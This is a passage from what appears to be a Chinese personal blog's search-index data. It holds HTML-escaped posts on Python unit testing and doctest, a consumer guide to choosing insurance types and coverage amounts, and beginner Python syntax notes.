Dict(dict):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, **kw):</span><br><span class=\"line\">        super().__init__(**kw)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __getattr__(self, key):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            return self[key]</span><br><span class=\"line\">        except KeyError:</span><br><span class=\"line\">            raise AttributeError(r&quot;&apos;Dict&apos; object has no attribute &apos;%s&apos;&quot; % key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __setattr__(self, key, value):</span><br><span class=\"line\">        self[key] = value</span><br><span class=\"line\">        </span><br><span class=\"line\">class TestDict(unittest.TestCase):</span><br><span class=\"line\"></span><br><span class=\"line\">    def test_init(self):</span><br><span class=\"line\">        d = Dict(a=1, b=&apos;test&apos;)</span><br><span class=\"line\">        self.assertEqual(d.a, 1)</span><br><span class=\"line\">        self.assertEqual(d.b, &apos;test&apos;)</span><br><span class=\"line\">        self.assertTrue(isinstance(d, dict))</span><br><span class=\"line\"></span><br><span class=\"line\">    def test_key(self):</span><br><span class=\"line\">        d = Dict()</span><br><span class=\"line\">        d[&apos;key&apos;] = &apos;value&apos;</span><br><span class=\"line\">        self.assertEqual(d.key, &apos;value&apos;)</span><br></pre></td></tr></table></figure>\n<p>通过继承类上面的<code>assertEqual</code>方法进行断言判断</p>\n<blockquote>\n<p>如何运行单元测试</p>\n</blockquote>\n<ul>\n<li>在最后加上两行代码</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    unittest.main()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在命令行通过参数<code>-m unittest</code>直接运行单元测试：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m unittest mydict_test</span><br></pre></td></tr></table></figure>\n<h2 id=\"文档测试\"><a href=\"#文档测试\" class=\"headerlink\" title=\"文档测试\"></a>文档测试</h2><p>通过编写文档的形式，指定函数调用，并确定函数的输入和输出值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def abs(n):</span><br><span class=\"line\">    &apos;&apos;&apos;</span><br><span class=\"line\">    Function to get absolute value of number.</span><br><span class=\"line\">    </span><br><span class=\"line\">    Example:</span><br><span class=\"line\">    </span><br><span class=\"line\">    &gt;&gt;&gt; abs(1)</span><br><span class=\"line\">    1</span><br><span class=\"line\">    &gt;&gt;&gt; abs(-1)</span><br><span class=\"line\">    1</span><br><span class=\"line\">    &gt;&gt;&gt; abs(0)</span><br><span class=\"line\">    0</span><br><span class=\"line\">    &apos;&apos;&apos;</span><br><span class=\"line\">    return n if n &gt;= 0 else (-n)</span><br></pre></td></tr></table></figure>\n<p>Python内置的“文档测试”（doctest）模块可以直接提取注释中的代码并执行测试。</p>\n<p>doctest严格按照Python交互式命令行的输入和输出来判断测试结果是否正确。只有测试异常的时候，可以用…表示中间一大段烦人的输出。</p>\n","categories":["python"],"tags":["python"]},{"title":"如何选购保险","url":"http://zhoushaw.github.io/2019/09/17/other/life/保险/","content":"<div><a id=\"more\"></a></div>\n\n<p>##保险</p>\n<ul>\n<li>保险越早买越好，每次过生日保费会越来越贵</li>\n</ul>\n<h1 id=\"保险的分类\"><a href=\"#保险的分类\" class=\"headerlink\" title=\"保险的分类\"></a>保险的分类</h1><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_2l7kjdk72icb8eg7353k24da98457_1300x731.jpg\" alt=\"\"></p>\n<h2 id=\"医疗保险\"><a href=\"#医疗保险\" class=\"headerlink\" title=\"医疗保险\"></a>医疗保险</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_2hj6g09g26efdel4i629f5gedcc69_1300x731.jpg\" alt=\"\"></p>\n<blockquote>\n<p>重疾险和医疗保险</p>\n</blockquote>\n<p>重疾险就是比如确诊了，保额50万给患者，患者可能几年内不能工作，这笔钱治病、生活、还有收入的损失。</p>\n<p>重疾险是给付型：是确诊就赔<br>医疗险是报销型：只报销医疗费用</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_0dlb3jlk88079a14bc4e7f70ib35b_1300x731.jpg\" alt=\"\"></p>\n<h2 id=\"意外险\"><a href=\"#意外险\" class=\"headerlink\" title=\"意外险\"></a>意外险</h2><ul>\n<li>最低保额50万，最少5年收入的额度</li>\n</ul>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_5184j5gaf2ji10a978b08ig2aflj1_1300x731.jpg\" alt=\"\"></p>\n<h2 id=\"寿险\"><a href=\"#寿险\" class=\"headerlink\" title=\"寿险\"></a>寿险</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_6blj2a3dhd34274f4ghh3j36d42dd_1300x731.jpg\" alt=\"\"></p>\n<p>买寿险的考虑的最基础因素是：</p>\n<ol>\n<li>是否为家庭经济支柱</li>\n<li>家庭是否有房贷负债等情况</li>\n<li>是否需要抚养子女等</li>\n</ol>\n<p>其他：</p>\n<ul>\n<li>谁来买：给家庭经济支柱买</li>\n<li>寿险保障到60岁退休以后就可以了</li>\n<li>孩子不承担家庭经济任务，不需要买</li>\n</ul>\n<h2 id=\"重疾险\"><a href=\"#重疾险\" class=\"headerlink\" title=\"重疾险\"></a>重疾险</h2><blockquote>\n<p>重疾险选购</p>\n</blockquote>\n<ul>\n<li>是否包含轻症赔付很重要</li>\n<li>小心多次赔付</li>\n<li>保额充足很重要，至少30-50万起</li>\n</ul>\n<blockquote>\n<p>多少保额够用呢</p>\n</blockquote>\n<p>根据现在医疗机构公布的数据，重大疾病至少需要三十万,而且重大疾病的康复周期是3-5年，最低保额=30万+3年年收入</p>\n<blockquote>\n<p>优先选择保障性，而不是返回型保险</p>\n</blockquote>\n<p>下图是保障型和返回型的价格对比，保障型有明显的价格优势</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_70kj8hl154g2l75929c62aa3gdf47_1300x731.jpg\" alt=\"\"></p>\n<blockquote>\n<p>根据预算确定期限</p>\n</blockquote>\n<p>成人重疾险一般可以保障70-80岁或者终生，预算充足可以直接选择终生。</p>\n<p>以35岁的成年保额50万举例的话终身重疾险险的保费大概是7000多元，如何预算是在有限可以保到70岁或者80岁。一个35岁的成年人保额50万保障到70岁，费用大概是4000多元</p>\n<p>如果特别想要终身保障，预算略显不足的话，可以通过终身和定期重疾险的组合配置来实现，我们可以把保额做一定的分割，一部分保额买定期中级，另一部分买终身重疾</p>\n<blockquote>\n<p>购买重疾险注意</p>\n</blockquote>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_16cc5ccfed3hc37g7a050108d0ad2_1300x731.jpg\" alt=\"\"></p>\n<blockquote>\n<p>怎么选</p>\n</blockquote>\n<p>需要考虑：</p>\n<ul>\n<li>保障期限</li>\n<li>疾病种类</li>\n<li>赔付次数</li>\n<li>健康告知</li>\n</ul>\n<h2 id=\"保险类型小结\"><a href=\"#保险类型小结\" class=\"headerlink\" title=\"保险类型小结\"></a>保险类型小结</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_8g7e16e30kcjla527h283dk086l18_1300x731.jpg\" alt=\"\"></p>\n<h2 id=\"如何顺利理赔\"><a href=\"#如何顺利理赔\" class=\"headerlink\" title=\"如何顺利理赔\"></a>如何顺利理赔</h2><p>关键点：做好健康告知</p>\n<p>原则：问啥答啥，不问不答，如实告知</p>\n<h2 id=\"配置顺序\"><a href=\"#配置顺序\" class=\"headerlink\" title=\"配置顺序\"></a>配置顺序</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_4hf15ff9771l73gfbdjb9j862f54l_1300x731.jpg\" alt=\"\"></p>\n<p>1.夫妻最优先配置<br>2.孩子<br>3.老人</p>\n<p><strong>重疾险</strong>和<strong>寿险</strong>首选</p>\n<p><strong>保额</strong>和<strong>保障期限</strong>是两个重要的因素之一</p>\n<h2 id=\"孩子选什么保险\"><a href=\"#孩子选什么保险\" class=\"headerlink\" title=\"孩子选什么保险\"></a>孩子选什么保险</h2><p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_4lk3920d7fbfl2el9dk1b984hgbgf_1300x731.jpg\" alt=\"\"></p>\n<ul>\n<li>孩子是不需要寿险的</li>\n<li>如果要选选择重疾险、医疗险、意外险</li>\n<li>切记给孩子买了保险，父母没买足保险</li>\n<li>先给孩子上医保</li>\n<li>如果要选就选儿童专属重疾，保证到成年即可<ul>\n<li>白血病</li>\n<li>重症手足口等</li>\n</ul>\n</li>\n<li>最长保到三十岁即可，保费可以便宜很多，而且保险日新月异，后面可以选择其他的保险</li>\n</ul>\n<h2 id=\"老人选什么\"><a href=\"#老人选什么\" class=\"headerlink\" title=\"老人选什么\"></a>老人选什么</h2><p>老人年龄大保费贵、老人一般都会有健康问题</p>\n<ul>\n<li>老人优选防癌险，防癌险相对重疾更加便宜，癌症最高发</li>\n<li>防癌险不会对种类进行要求，都会赔付</li>\n<li>父母年龄越大，疾病发生，他们非常需要保险</li>\n<li>在买保险前先咨询专业的人士，这样在赔付时才不会出现理赔纠纷</li>\n</ul>\n<h2 id=\"如何配置家庭保险\"><a href=\"#如何配置家庭保险\" class=\"headerlink\" title=\"如何配置家庭保险\"></a>如何配置家庭保险</h2><blockquote>\n<p>高房贷，家庭收入集中在个人身上</p>\n</blockquote>\n<p>家庭主要经济来源需要配置高额度寿险，可以保障到60岁退休</p>\n<blockquote>\n<p>买保险，充分分析自己的情况和需求进行选择</p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>理财和保障分开做，不要买理财保险</li>\n<li>优先给家庭经济支柱配置保险</li>\n<li>考虑到性价比，不要给孩子买捆绑了寿险的重疾险</li>\n<li>预算在有限，都不能妥协保障额度</li>\n<li>不能人云亦云，要给予自己家庭情况进行配置规划</li>\n</ul>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_565a6b9al38542j3a4i4h396e7idb_1300x731.jpg\" alt=\"\"></p>\n","categories":["life"],"tags":["life"]},{"title":"python知识","url":"http://zhoushaw.github.io/2019/09/11/learning/python/python-basics/","content":"<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>本文是Python的笔记，<a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400\" target=\"_blank\" rel=\"noopener\">教程文档</a></p>\n<h2 id=\"输入\"><a href=\"#输入\" class=\"headerlink\" title=\"输入\"></a>输入</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name = input(&apos;please enter your name: &apos;)</span><br><span class=\"line\">print(&apos;hello,&apos;, name)</span><br></pre></td></tr></table></figure>\n<p>命令行展示:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Workspace&gt; python hello.py</span><br><span class=\"line\">please enter your name: Michael</span><br><span class=\"line\">hello, Michael</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><ul>\n<li>整型</li>\n<li>浮点型</li>\n<li>字符串</li>\n<li>布尔值</li>\n<li>空值</li>\n</ul>\n<p><code>int()</code>函数可以将字符类型的数字转成int型</p>\n<blockquote>\n<p>字符串</p>\n</blockquote>\n<p><code>某些特殊字符进行“转义”，Python 字符串用 \\ 进行转义</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\n 表示换行</span><br><span class=\"line\">\\t 表示一个制表符</span><br><span class=\"line\">\\\\ 表示 \\ 字符本身</span><br></pre></td></tr></table></figure>\n<ul>\n<li>对特殊字符串进行转义，使用\\，对多个特殊字符进行转换是使用r’特殊字符’</li>\n<li>多行’’’…..’’’,类似js<code></code>模板字符串</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&apos;&apos;&apos;line1</span><br><span class=\"line\">... line2</span><br><span class=\"line\">... line3&apos;&apos;&apos;)</span><br><span class=\"line\">line1</span><br><span class=\"line\">line2</span><br><span class=\"line\">line3</span><br></pre></td></tr></table></figure>\n<p><strong>读取中文</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python3</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure>\n<p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为 UTF-8 编码。当Python 解释器读取源代码时，为了让它按 UTF-8 编码读取</p>\n<blockquote>\n<p>布尔型</p>\n</blockquote>\n<ul>\n<li>布尔值可以用 and、or 和 not 运算。</li>\n<li>and 运算是与运算，只有所有都为 True，and 运算结果才是 True。</li>\n<li>or 运算是或运算，只要其中有一个为 True，or 运算结果就是 True。</li>\n<li>not 运算是非运算，它是一个单目运算符，把 True 变成 False，False 变成 True。</li>\n</ul>\n<h2 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h2><p>ASCII：不包含中文<br>Unicode：国际标准编码<br>UTF-8：对Unicode进行了优化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python3</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释；</li>\n<li>第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。</li>\n</ul>\n<h2 id=\"字符串拼接\"><a href=\"#字符串拼接\" class=\"headerlink\" title=\"字符串拼接\"></a>字符串拼接</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;Hello, %s&apos; % &apos;world&apos;</span><br><span class=\"line\">&apos;Hello, world&apos;</span><br><span class=\"line\">&apos;Hi, %s, you have $%d.&apos; % (&apos;Michael&apos;, 1000000)</span><br><span class=\"line\">&apos;Hi, Michael, you have $1000000.&apos;</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>占位符</th>\n<th>替换内容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>%d</td>\n<td>整数</td>\n</tr>\n<tr>\n<td>%f</td>\n<td>浮点数</td>\n</tr>\n<tr>\n<td>%s</td>\n<td>字符串</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>十六进制整数</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h2><h3 id=\"list\"><a href=\"#list\" class=\"headerlink\" title=\"list\"></a>list</h3><p>Python内置的一种数据类型是列表：list。list是一种有序的集合，可以随时添加和删除其中的元素。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">classmates = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class=\"line\">classmates</span><br><span class=\"line\">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取数组长度:<code>len(classmates)</code></li>\n<li>通过索引下标获取值: <code>classmates[0]</code><ul>\n<li>输出：<code>&#39;Michael&#39;</code></li>\n</ul>\n</li>\n<li>指定位置插入：<code>classmates.insert(1, &#39;Jack&#39;)</code></li>\n<li>在最后插入：<code>classmates.append(&#39;Adam&#39;)</code></li>\n<li>在最后删除：<code>classmates.pop()</code></li>\n<li>删除指定位置 <code>classmates.pop(1)</code></li>\n<li>取list区间值：<code>L[star:end]</code>，取0到3之间的元素不包含end<ul>\n<li>索引为0时可以省略<code>L[:3]</code>取前三个</li>\n<li>可以用-数序号，倒数第一个元素的索引是-1，取后十个: <code>L[-10:]</code></li>\n<li>前10个数，每两个取一个: <code>L[:10:2]</code></li>\n<li>字符串也可以与list类似的取值方式</li>\n</ul>\n</li>\n<li>数组反转<ul>\n<li>reverse，<code>list.reverse()</code></li>\n<li>切片反转<code>list[::-1]</code></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"列表生成器\"><a href=\"#列表生成器\" class=\"headerlink\" title=\"列表生成器\"></a>列表生成器</h4><blockquote>\n<p>生成list</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list(range(1, 11))</span><br><span class=\"line\">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>迭代元素基础上增加</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[x * x for x in range(1, 11)]</span><br><span class=\"line\">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>迭代元素筛选，仅留下偶数</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[x * x for x in range(1, 11) if x % 2 == 0]</span><br><span class=\"line\">[4, 16, 36, 64, 100]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>两层循环</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;]</span><br><span class=\"line\">#[&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;]</span><br></pre></td></tr></table></figure>\n<h4 id=\"生成器\"><a href=\"#生成器\" class=\"headerlink\" title=\"生成器\"></a>生成器</h4><ul>\n<li>将迭代器的<code>[]</code>更改成<code>()</code>生成的将会是迭代器，迭代器保存的数据的规则</li>\n<li>生成器对象可以通过<code>next()</code>函数调用</li>\n<li>生成器也可以通过<code>for in</code>迭代</li>\n</ul>\n<h3 id=\"tuple-元组\"><a href=\"#tuple-元组\" class=\"headerlink\" title=\"tuple(元组)\"></a>tuple(元组)</h3><p>tuple与list类似，都是但是tuple初始化完成后，不可添加删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">classmates = (&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;)</span><br></pre></td></tr></table></figure>\n<p>也可以通过下标<code>0</code>、<code>1</code>访问tuple内的元素</p>\n<p>定义一个元组时,需要增加<code>,</code>号，因为()一般也用于计算，为了区分所以要增加<code>,</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = (&apos;few&apos;,)</span><br></pre></td></tr></table></figure>\n<h2 id=\"条件判断\"><a href=\"#条件判断\" class=\"headerlink\" title=\"条件判断\"></a>条件判断</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">age = 3</span><br><span class=\"line\">if age &gt;= 18:</span><br><span class=\"line\">    print(&apos;adult&apos;)</span><br><span class=\"line\">elif age &gt;= 6:</span><br><span class=\"line\">    print(&apos;teenager&apos;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure>\n<p>or</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if &lt;条件判断1&gt;:</span><br><span class=\"line\">    &lt;执行1&gt;</span><br><span class=\"line\">elif &lt;条件判断2&gt;:</span><br><span class=\"line\">    &lt;执行2&gt;</span><br><span class=\"line\">elif &lt;条件判断3&gt;:</span><br><span class=\"line\">    &lt;执行3&gt;</span><br><span class=\"line\">else:</span><br><span class=\"line\">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure>\n<p>if判断条件还可以简写，比如写：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if x:</span><br><span class=\"line\">    print(&apos;True&apos;)</span><br></pre></td></tr></table></figure>\n<p>只要x是非零数值、非空字符串、非空list等，就判断为True，否则为False</p>\n<h2 id=\"循环\"><a href=\"#循环\" class=\"headerlink\" title=\"循环\"></a>循环</h2><blockquote>\n<p>循环数组</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class=\"line\">for name in names:</span><br><span class=\"line\">    print(name)</span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Michael</span><br><span class=\"line\">Bob</span><br><span class=\"line\">Tracy</span><br></pre></td></tr></table></figure>\n<p>for in 就是按顺序迭代</p>\n<p><code>range()</code>函数可以生成一个整数序列，再通过list()函数可以转换为list</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list(range(5))</span><br><span class=\"line\">[0, 1, 2, 3, 4]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>while循环</p>\n</blockquote>\n<p>输出1+2+…+10结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">n = 10</span><br><span class=\"line\">while n &gt; 0:</span><br><span class=\"line\">    sum = sum + n</span><br><span class=\"line\">    n = n - 1</span><br><span class=\"line\">print(sum)</span><br></pre></td></tr></table></figure>\n<p>提前终止</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">n = 10</span><br><span class=\"line\">while n &gt; 0:</span><br><span class=\"line\">    if n&lt;5:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    sum = sum + n</span><br><span class=\"line\">    n = n - 1</span><br><span class=\"line\">print(sum)</span><br></pre></td></tr></table></figure>\n<p>continue，跳过当前循环，执行下一循环，例：不加偶数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">n = 10</span><br><span class=\"line\">while n &gt; 0:</span><br><span class=\"line\">    n = n - 1</span><br><span class=\"line\">    if n%2==0:</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    sum = sum + n</span><br><span class=\"line\">print(sum)</span><br></pre></td></tr></table></figure>\n<h2 id=\"字典dict\"><a href=\"#字典dict\" class=\"headerlink\" title=\"字典dict\"></a>字典dict</h2><p>dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储</p>\n<p>dict的key必须是不可以变的所以，key不可以是list或另一个dict，字符、整数这些就是不可变的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85&#125;</span><br><span class=\"line\">d[&apos;Michael&apos;]</span><br><span class=\"line\">95</span><br></pre></td></tr></table></figure>\n<ul>\n<li>添加新key-value<code>d[&#39;Adam&#39;] = 67</code></li>\n<li>获取不存在的key会报错<code>d[&#39;shaw&#39;]</code></li>\n<li>通过in判断key是否存在<code>&#39;Thomas&#39; in d</code></li>\n<li><code>get()</code>方法判断是否存在<ul>\n<li>如果key不存在，返回None</li>\n<li><code>d.get(&#39;shaw&#39;,-1)</code>，不存在指定返回-1</li>\n</ul>\n</li>\n<li>删除指定key<code>d.pop(&#39;Bob&#39;)</code></li>\n<li>迭代<code>dict</code>的<code>key</code>和<code>value</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;&apos;x&apos;: &apos;A&apos;, &apos;y&apos;: &apos;B&apos;, &apos;z&apos;: &apos;C&apos; &#125;</span><br><span class=\"line\">for k, v in d.items():</span><br><span class=\"line\">...     print(k, &apos;=&apos;, v)</span><br></pre></td></tr></table></figure>\n<h2 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h2><p>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key</p>\n<p>要创建一个set，需要提供一个list作为输入集合：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = set([1, 2, 3])</span><br><span class=\"line\">s</span><br><span class=\"line\">#&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>重复的将自动过滤掉</li>\n<li>通过<code>add(key)</code>方法可以添加元素到set中<code>s.add(4)</code></li>\n<li>通过<code>remove(key)</code>方法可以删除元素,s.remove(4)</li>\n</ul>\n<blockquote>\n<p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s1 = set([1, 2, 3])</span><br><span class=\"line\">s2 = set([2, 3, 4])</span><br><span class=\"line\">s1 &amp; s2</span><br><span class=\"line\">&#123;2, 3&#125;</span><br><span class=\"line\">s1 | s2</span><br><span class=\"line\">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息</p>\n<ul>\n<li><code>abs</code>: 求绝对值的函数</li>\n<li><code>max</code>: 